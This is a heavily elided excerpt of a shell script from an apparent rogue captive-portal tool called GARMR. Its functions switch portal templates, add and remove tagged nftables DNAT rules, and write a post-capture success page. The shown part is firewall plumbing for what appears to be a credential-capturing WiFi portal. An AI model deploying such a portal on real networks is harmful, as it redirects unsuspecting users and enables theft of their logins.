...
activate_portal() {
    ...
    # === VALIDATE PORTAL EXISTS (v4.7.6 fix) ===
    if [ ! -d "$portal_path" ] || [ ! -f "$portal_path/index.php" ]; then
        LOG "WARNING: Portal $portal_name not found!"
        LOG "Falling back to generic WiFi portal..."
        portal_name="garmr_wifi"
        portal_path="$PORTAL_DIR/$portal_name"

        if [ ! -d "$portal_path" ]; then
            LOG "ERROR: No portals installed!"
            ERROR_DIALOG "Portal files missing!\n\nReinstall GARMR payload."
            return 1
        fi
    fi
    ...
    # ============================================
    # STEP 2: REMOVE GARMR DNAT RULES ONLY
    # ============================================
    LOG "Step 2: Removing old GARMR DNAT rules..."
    # Only delete rules with GARMR comment - preserves WAN and other rules
    for handle in $(/usr/sbin/nft -a list chain inet fw4 dstnat 2>/dev/null | grep "GARMR" | awk '{print $NF}'); do
    ...
    if [ "$dnat_count" -gt 0 ]; then
        LOG "WARNING: GARMR rules not fully removed, retrying..."
        for handle in $(/usr/sbin/nft -a list chain inet fw4 dstnat 2>/dev/null | grep "GARMR" | awk '{print $NF}'); do
            /usr/sbin/nft delete rule inet fw4 dstnat handle "$handle" 2>/dev/null
        done
        sleep 1
    fi
    LOG "GARMR DNAT rules removed"
    ...
    # Success page for post-capture redirect
    cat > /www/success.html << 'SUCCESSEOF'
<!DOCTYPE html>
<html>
...
deactivate_portal() {
    ...
    # Remove GARMR DNAT rules only - preserves WAN and other rules
    for handle in $(/usr/sbin/nft -a list chain inet fw4 dstnat 2>/dev/null | grep "GARMR" | awk '{print $NF}'); do
        /usr/sbin/nft delete rule inet fw4 dstnat handle "$handle" 2>/dev/null
    done
